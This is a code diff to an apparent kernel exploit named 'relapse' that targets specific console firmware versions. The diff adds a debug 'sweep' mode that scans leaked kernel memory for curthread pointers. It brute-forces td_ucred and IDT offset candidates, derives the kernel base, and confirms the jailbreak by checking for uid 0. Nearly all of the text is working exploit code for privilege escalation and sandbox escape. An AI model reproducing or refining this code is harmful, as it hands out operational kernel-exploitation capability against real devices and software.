@@ -128,13 +128,13 @@ const SWEEP = rcfg('sweep', 256)
 const DEBUG_F = rcfg('debug_f', 0)
 const ONUM_N = rcfg('onum', 64)
 const KA = rcfg('ka', 32768)
-const MAX_RETRIES = rcfg('retries', 3)
+let MAX_RETRIES = rcfg('retries', 3)
 
 const PAIR = 0x10001 // STEP_MAG + 1
 const KB = PAIR
 const MAXN = 2 * KA + KB + 16
 const STEP_OFF = 2
-const TD_UCRED_OFF = 0x130
+let TD_UCRED_OFF = 0x130
 const TD_PROC = 0x08
 
 const IDT = new BigInt(0xffffff80, 0x00001a00)
@@ -203,6 +203,19 @@ function check (name: string, ok: boolean, detail?: string) {
 
 function trace (tag: string, detail?: string) {
   mark(tag, detail)
+}
+
+// ---------------------------------------------------------------------------
+// Sweep summary (debug-blackboard PRUEBA 3): one line with the adopted matchers
+// ---------------------------------------------------------------------------
+function emitSweepSummary (verdict: string) {
+  if (!SWEEP_MODE) return
+  const s = 'owner=0x' + (OWNER_LO * 4).toString(16) +
+    ' sink=0x' + N0SINK_OFF.toString(16) +
+    ' tduc=0x' + TD_UCRED_OFF.toString(16) +
+    ' ' + verdict
+  try { jsmaf.sweep_summary = s } catch (e) { /* optional */ }
+  mark('SWEEP-SUMMARY', s)
 }
 
 // ---------------------------------------------------------------------------
@@ -291,8 +304,8 @@ let OTHER = -1
 let pinRestore: (() => void) | null = null
 
 let mAb: ArrayBuffer, mU32: Uint32Array, mU8: Uint8Array, M_AD: BigInt
-const OWNER_LO = 6
-const OWNER_HI = 7
+let OWNER_LO = 6
+let OWNER_HI = 7
 
 let lkAb: ArrayBuffer, lkDv: DataView, lkNad: BigInt
 let LX: BigInt
@@ -325,7 +338,7 @@ let dumAb: ArrayBuffer, dumDv: DataView, dumAd: BigInt
 let DUM: BigInt
 let snkAb: ArrayBuffer, snkDv: DataView, snkAd: BigInt
 let SNK: BigInt
-const N0SINK_OFF = 0x20
+let N0SINK_OFF = 0x20
 let gfAb: ArrayBuffer, gfDv: DataView, gfAd: BigInt
 let glAb: ArrayBuffer, glDv: DataView, glAd: BigInt
 let mibAb: ArrayBuffer, mibDv: DataView, mibAd: BigInt
@@ -357,6 +370,26 @@ let capsPend = 0
 
 // KEX Konstants (passA/passB)
 const B: Record<string, number> = {}
+
+// ---------------------------------------------------------------------------
+// Manual mode (debug-blackboard PRUEBA 1/2/3) + sweep state
+// ---------------------------------------------------------------------------
+let NO_FALLBACK = false
+let SWEEP_MODE = false
+let FORCE_IDT: number | null = null
+
+const TDUC_CANDS = [0x130, 0x128, 0x138, 0x140]
+const RVA_CANDS = [0x1c1d00, 0x1c1d20, 0x1c1d40, 0x1c1d50]
+let tducTry = 0
+let sinkAdopted = false
+let swWin = -1
+let swLo = 0
+let swHi = 0
+const swCount: number[] = []
+const swLoVal: number[] = []
+const swHiVal: number[] = []
+const sinkCount: number[] = []
+const sinkVal: number[] = []
 
 // ---------------------------------------------------------------------------
 // Buffer helpers (memcpy-view based, polpNO-compatible)
@@ -470,11 +503,13 @@ function relapse_fail (reason: string, benign: boolean) {
   relapse_dead = true
   cleanup(true)
   mark('FAIL-FINAL', reason + ' (benign=' + (benign ? 1 : 0) + ')')
+  emitSweepSummary('fail: ' + reason)
   try {
     utils.notify('Relapse failed! restart the exploit and try again...')
   } catch (e) { /* notify optional */ }
-  // Experimental 12.50/12.52: fall back to netctrl (poops), proven there
-  if ((FW_VERSION === '12.50' || FW_VERSION === '12.52') && typeof include === 'function') {
+  // Experimental 12.50/12.52: fall back to netctrl (poops), proven there.
+  // Manual mode disables the fallback so the board keeps the failing stage.
+  if (!NO_FALLBACK && (FW_VERSION === '12.50' || FW_VERSION === '12.52') && typeof include === 'function') {
     mark('NETCTRL-FALLBACK', 'relapse exhausted, falling back to netctrl')
     try { jsmaf.exploit_path = 'netctrl(fallback)' } catch (e) { /* optional */ }
     try {
@@ -928,7 +963,7 @@ function whoHasF () {
     glDv.setInt32(4, 0, true)
     new Uint8Array(gfAb).fill(0)
     if (Number(getsockopt(POOL[i], IPPROTO_IPV6, IPV6_RTHDR, gfAd, glAd).lo) !== 0) continue
-    const st = gfDv.getUint32(0x20, true) >>> 0
+    const st = gfDv.getUint32(N0SINK_OFF, true) >>> 0
     if (st !== 0) {
       hits++
       if (found < 0) {
@@ -936,8 +971,37 @@ function whoHasF () {
         state0 = st
       }
     }
+    if (SWEEP_MODE) {
+      for (let o = 0; o + 4 <= RTH_SIZE; o += 4) {
+        const v = gfDv.getUint32(o, true) >>> 0
+        if (v === 0) continue
+        sinkCount[o] = (sinkCount[o] || 0) + 1
+        sinkVal[o] = v
+      }
+    }
   }
   return { idx: found, hits, state: state0 }
+}
+
+// SWEEP: if the state write lands at another offset than the 13.00 layout,
+// adopt the offset that fires most often and report every candidate.
+function sweepSinkReport (label: string) {
+  if (!SWEEP_MODE) return
+  const parts: string[] = []
+  let best = -1
+  let bestC = 1
+  for (let o = 0; o + 4 <= RTH_SIZE; o += 4) {
+    const c = sinkCount[o] || 0
+    if (!c) continue
+    parts.push('0x' + o.toString(16) + ':' + c + '=0x' + (sinkVal[o] || 0).toString(16))
+    if (c > bestC) { bestC = c; best = o }
+  }
+  if (!sinkAdopted && best >= 0 && best !== N0SINK_OFF) {
+    N0SINK_OFF = best
+    sinkAdopted = true
+    mark('SWEEP-SINK-ADOPT', label + ' sink_off -> 0x' + N0SINK_OFF.toString(16) + ' hits=' + bestC)
+  }
+  mark('SWEEP-SINK', label + ' ' + (parts.join(' ') || '-'))
 }
 
 function reapNow (tag: string) {
@@ -965,11 +1029,13 @@ function runChain (nNodes: number, label: string): number | null {
   aio_multi_cancel(idAd2, 1, stAd2)
   const moved = 0x40000000 - snkDv.getInt32(0x00, true)
   const n0 = 0x40000000 - snkDv.getInt32(N0SINK_OFF, true)
-  const w = DEBUG_F ? whoHasF() : { idx: -9, hits: 0, state: 0 }
+  const w = (DEBUG_F || SWEEP_MODE) ? whoHasF() : { idx: -9, hits: 0, state: 0 }
   mark('PR-FIRE', label + ' nodes=' + nNodes + ' sink_moved=' + moved + ' node0_sink=' + n0 + ' f_socket=' + w.idx + ' f_hits=' + w.hits + ' state=0x' + w.state.toString(16) + ' (' + a + ')')
+  try { jsmaf.sweep_ready = true } catch (e) { /* optional */ }
   if (n0 === 1 && w.idx < 0) {
     mark('PR-F-UNSEEN', 'node0 fired but no pool socket carries the state write')
   }
+  sweepSinkReport(label)
   reapNow('a=' + armCount)
   return moved
 }
@@ -1115,6 +1181,23 @@ function relapse_leak_pre () {
 // ---------------------------------------------------------------------------
 // PHASE 2b: chunked spin (owner-stamp leak) → CT1
 // ---------------------------------------------------------------------------
+// SWEEP (PRUEBA 3): the kernel may write the leaked pointer at a different
+// dword pair than the 13.00 layout (+0x18). Scan the whole M_AD buffer every
+// 512 iterations and keep per-offset counters instead of assuming 6/7.
+function sweepScanOwners (mu32: Uint32Array) {
+  for (let d = 0; d < 15; d++) {
+    const h = mu32[d + 1]
+    if ((h >>> 0) < 0xffff0000) continue
+    const l = mu32[d]
+    if (mu32[d + 1] !== h || (l >>> 0) === 4) continue
+    const c = (swCount[d] || 0) + 1
+    swCount[d] = c
+    swLoVal[d] = l >>> 0
+    swHiVal[d] = h >>> 0
+    if (c === 49 && swWin < 0) swWin = d
+  }
+}
+
 function relapse_leak_spin () {
   const chunk = SPIN_CHUNK
   const end = spinI + chunk < SPIN ? spinI + chunk : SPIN
@@ -1122,8 +1205,17 @@ function relapse_leak_spin () {
   const mu32 = mU32
   const ol = OWNER_LO
   const oh = OWNER_HI
+  const sw = SWEEP_MODE
   for (let i = spinI; i < end; i++) {
     mu8[0x30 + (i & 15)] = i & 0xff
+    if (sw) {
+      if ((i & 511) === 0) sweepScanOwners(mu32)
+      if (swWin >= 0) {
+        spinI = end
+        yield_to_render(relapse_leak_finish)
+        return
+      }
+    }
     const hi1 = mu32[oh]
     if (hi1 !== 0) {
       const lo = mu32[ol]
@@ -1158,16 +1250,38 @@ function relapse_leak_finish () {
   for (const v of spinSamples) uniq[v] = (uniq[v] || 0) + 1
   const keys = Object.keys(uniq)
   const drop = 0x40000000 - lkDv2.getInt32(0x00, true)
-  mark('PR-LEAK', 'hits=' + spinHits + ' walked=' + drop + '/' + N_LEAK + ' uniq=' + keys.length)
+  mark('PR-LEAK', 'hits=' + spinHits + ' walked=' + drop + '/' + N_LEAK + ' uniq=' + keys.length +
+    (SWEEP_MODE ? ' scan=' + swCount.map(function (c, d) { return c ? d * 4 + ':' + c : '' }).filter(Boolean).join(',') : ''))
+  if (SWEEP_MODE && swWin >= 0) {
+    const d = swWin
+    OWNER_LO = d
+    OWNER_HI = d + 1
+    spinHitLo = swLoVal[d]!
+    spinHitHi = swHiVal[d]!
+    spinHits = swCount[d]!
+    mark('SWEEP-OWNER', 'offset=0x' + (d * 4).toString(16) + ' hits=' + spinHits + ' value=' +
+      (spinHitHi >>> 0).toString(16) + (spinHitLo >>> 0).toString(16) + ' (default 0x18)')
+    CT1 = new BigInt(spinHitHi >>> 0, spinHitLo >>> 0)
+    mark('PR-LEAK-HIT', 'curthread=' + hex(CT1 as BigInt))
+    try { jsmaf.sweep_ready = true } catch (e) { /* optional */ }
+    relapse_reapleak()
+    relapse_pass_prelims()
+    return
+  }
   if (!spinHits || (spinHitHi >>> 0) < 0xffff0000 || keys.length !== 1) {
     // curthread leak did not stick
     relapse_reapleak()
+    if (SWEEP_MODE) {
+      const seen = swCount.map(function (c, d) { return c ? '0x' + (d * 4).toString(16) + ':' + c : '' }).filter(Boolean).join(' ')
+      mark('SWEEP-OWNER-NONE', 'no stable kernel qword in M_AD (hits=' + spinHits + ' uniq=' + keys.length + ') offsets=' + (seen || '-'))
+    }
     relapse_fail('leak: no owner stamp', true)
     return
   }
   // polpNO int64(hitLo, hitHi) -> Vue BigInt(hi, lo)
   CT1 = new BigInt(spinHitHi >>> 0, spinHitLo >>> 0)
   mark('PR-LEAK-HIT', 'curthread=' + hex(CT1 as BigInt))
+  try { jsmaf.sweep_ready = true } catch (e) { /* optional */ }
   relapse_reapleak()
   relapse_pass_prelims()
 }
@@ -1227,12 +1341,21 @@ function relapse_pass () {
     return
   }
   if (mA <= 0) {
-    mark('PR-PASSA-NOCROSS', 'no crossing: low dword either exceeds ' + (KA * PAIR) + ' or is already negative')
+    mark('PR-PASSA-NOCROSS', 'no crossing: low dword either exceeds ' + (KA * PAIR) + ' or is already negative (td_ucred_off=0x' + TD_UCRED_OFF.toString(16) + ')')
+    if (SWEEP_MODE && tducTry + 1 < TDUC_CANDS.length) {
+      tducTry++
+      const next = TDUC_CANDS[tducTry]!
+      mark('SWEEP-TDUCRED', 'nocross at 0x' + TD_UCRED_OFF.toString(16) + ' -> try 0x' + next.toString(16) +
+        ' (' + (tducTry + 1) + '/' + TDUC_CANDS.length + ')')
+      TD_UCRED_OFF = next
+      relapse_pass()
+      return
+    }
     relapse_fail('passA nocross', true)
     return
   }
   const kA = KA - mA + 1
-  mark('PR-PASSA', 'm=' + mA + ' -> k=' + kA + ' W0 in (' + ((kA - 1) * PAIR) + ', ' + (kA * PAIR) + ']')
+  mark('PR-PASSA', 'm=' + mA + ' -> k=' + kA + ' W0 in (' + ((kA - 1) * PAIR) + ', ' + (kA * PAIR) + '] tduc=0x' + TD_UCRED_OFF.toString(16))
 
   // passB
   const RED = (kA - 1) * PAIR
@@ -1383,9 +1506,29 @@ function relapse_anchor_head () {
   }
   check('anchor-duplicates-agree', B.b6 === B.b6d && B.b7 === B.b7d, 'b6=' + B.b6 + ' b6d=' + B.b6d + ' b7=' + B.b7 + ' b7d=' + B.b7d)
   const handlerLo = (((B.b7! << 24) >>> 0) + ((B.b6! << 16) >>> 0) + (B.b1! << 8) + B.b0!) >>> 0
-  const kbLo = (handlerLo - RVA_RSVD) >>> 0
+  // SWEEP (PRUEBA 3): the IDT measurement above does not depend on idt_rsvd,
+  // only the subtraction does. Try every candidate and keep the 0x4000-aligned
+  // one instead of burning another attempt on a different hypothesis.
+  let rvaUse = RVA_RSVD
+  if (SWEEP_MODE) {
+    let win = -1
+    let count = 0
+    const seen: string[] = []
+    for (const r of RVA_CANDS) {
+      const lo = (handlerLo - r) >>> 0
+      seen.push('0x' + r.toString(16) + '->0x' + lo.toString(16) + ((lo & 0x3fff) === 0 ? '*' : ''))
+      if ((lo & 0x3fff) === 0) { win = r; count++ }
+    }
+    if (count === 1) {
+      rvaUse = win
+      mark('SWEEP-RVA', 'rva=0x' + rvaUse.toString(16) + ' (was 0x' + RVA_RSVD.toString(16) + ') ' + seen.join(' '))
+    } else {
+      mark('SWEEP-RVA-NONE', 'handler=0x' + handlerLo.toString(16) + ' aligned=' + count + ' tried=' + seen.join(' '))
+    }
+  }
+  const kbLo = (handlerLo - rvaUse) >>> 0
   KBASE = new BigInt(0xffffffff, kbLo)
-  mark('ANCHOR-HANDLER', 'handler=0xffffffff' + handlerLo.toString(16).padStart(8, '0') + ' rva=0x' + RVA_RSVD.toString(16))
+  mark('ANCHOR-HANDLER', 'handler=0xffffffff' + handlerLo.toString(16).padStart(8, '0') + ' rva=0x' + rvaUse.toString(16))
   const kbAligned = (kbLo & 0x3fff) === 0
   check('ANCHOR-KERNEL-BASE', kbAligned, 'kernel_base=' + hex(KBASE as BigInt) + ' aligned0x4000=' + (kbAligned ? 1 : 0) + ' low=0x' + kbLo.toString(16))
   if (!kbAligned) {
@@ -1393,6 +1536,7 @@ function relapse_anchor_head () {
     relapse_fail('kernel base not aligned', true)
     return
   }
+  if (SWEEP_MODE) emitSweepSummary('anchor-ok rva=0x' + rvaUse.toString(16))
   yield_to_render(relapse_rw)
 }
 
@@ -1830,6 +1974,7 @@ function relapse_jailbreak () {
   }
   const uid = Number(getuid().lo) >>> 0
   mark('KJ-OK', 'getuid=' + uid + ' kernel_base=' + hex(KBASE as BigInt) + ' armings=' + armCount)
+  emitSweepSummary('ok uid=' + uid + ' kbase=' + hex(KBASE as BigInt))
   if (uid !== 0) {
     relapse_fail('uid nonzero after jailbreak', false)
     return
@@ -1857,8 +2002,8 @@ function relapse_fwcheck () {
     mark('FW-NO-TABLE', 'fw=' + fw + ' -> relapse covers 12.50/12.52/13.00/13.02/13.04 only; 12.02 and below run lapse')
     return false
   }
-  K_TABLE = tab
-  idt_alt = (fw === '12.50' || fw === '12.52') ? 0x1c1d40 : null
+  K_TABLE = FORCE_IDT !== null ? Object.assign({}, tab, { idt_rsvd: FORCE_IDT }) : tab
+  idt_alt = FORCE_IDT !== null ? null : ((fw === '12.50' || fw === '12.52') ? 0x1c1d40 : null)
   const off = get_kernel_offset(fw)
   if (!off || typeof off.PRISON0 !== 'number') {
     mark('KERNEL-OFFSET-FAIL', 'jailbreak_shared offsets unavailable for fw=' + fw)
@@ -1873,7 +2018,9 @@ export function relapse () {
     return
   }
   relapse_tries++
-  mark('START', 'try ' + relapse_tries + '/' + MAX_RETRIES)
+  mark('START', 'try ' + relapse_tries + ' maxRetries=' + MAX_RETRIES +
+    ' idt=' + (K_TABLE ? '0x' + K_TABLE.idt_rsvd.toString(16) : 'auto') +
+    ' sweep=' + (SWEEP_MODE ? 1 : 0) + ' noFallback=' + (NO_FALLBACK ? 1 : 0))
   if (!relapse_fwcheck()) {
     relapse_fail('fw gate', false)
     return
@@ -1882,4 +2029,45 @@ export function relapse () {
     utils.notify('FW ' + FW_VERSION + ' Detected! Relapse/663' + (idt_alt !== null ? ' (experimental)' : ''))
   } catch (e) { /* optional */ }
   relapse_setup()
+}
+
+// ---------------------------------------------------------------------------
+// Manual mode reset (debug-blackboard PRUEBA 1/2/3)
+// ---------------------------------------------------------------------------
+export function relapse_debug_reset (attempt: number) {
+  relapse_dead = false
+  relapse_tries = 0
+  K_TABLE = null
+  idt_alt = null
+  FW_VERSION = null
+  CT1 = null
+  UCRED = null
+  KBASE = null
+  CAPS_B = null
+  CAPS_PR = null
+  capsPend = 0
+  NO_FALLBACK = true
+  SWEEP_MODE = attempt === 3
+  FORCE_IDT = attempt === 2 ? 0x1c1d40 : (attempt === 1 ? 0x1c1d00 : null)
+  MAX_RETRIES = attempt === 3 ? rcfg('retries', 3) : 0
+  OWNER_LO = 6
+  OWNER_HI = 7
+  N0SINK_OFF = 0x20
+  TD_UCRED_OFF = TDUC_CANDS[0]!
+  tducTry = 0
+  sinkAdopted = false
+  swWin = -1
+  swLo = 0
+  swHi = 0
+  swCount.length = 0
+  swLoVal.length = 0
+  swHiVal.length = 0
+  sinkCount.length = 0
+  sinkVal.length = 0
+  try { jsmaf.sweep_summary = '' } catch (e) { /* optional */ }
+  try { jsmaf.sweep_ready = false } catch (e) { /* optional */ }
+  mark('DEBUG-RESET', 'attempt=' + attempt + ' retries=' + MAX_RETRIES +
+    ' idt=' + (FORCE_IDT === null ? 'auto' : '0x' + FORCE_IDT.toString(16)) +
+    ' sweep=' + (SWEEP_MODE ? 1 : 0) + ' noFallback=1 owner=0x18 sink=0x' + N0SINK_OFF.toString(16) +
+    ' tduc=0x' + TD_UCRED_OFF.toString(16))
 }
